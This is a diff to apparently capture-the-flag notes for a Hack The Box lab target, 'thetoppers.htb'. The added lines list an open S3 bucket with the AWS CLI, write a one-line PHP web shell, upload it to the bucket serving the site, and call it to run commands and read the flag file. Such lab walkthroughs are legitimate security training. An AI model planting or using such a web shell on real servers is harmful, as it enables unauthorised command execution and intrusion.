@@ -103,5 +103,11 @@ echo "<ip_address> thetoppers.htb" >> /etc/hosts
 sudo wfuzz -c -w /usr/share/wordlists/dirb/common.txt -u <ip_address>/
 s3.thetoppers.htb
 sudo apt-get install awscli -y
-
+echo "<ip_adress> s3.thetoppers.htb" >> /etc/hosts
+aws --endpoint=http://s3.thetoppers.htb s3 ls
+aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+echo '<?php system($_GET["cmd"]); ?>' >> shell.php
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+http://thetoppers.htb/shell.php?cmd=ls
+http://thetoppers.htb/shell.php?cmd=cat%20../flag.txt
 ```
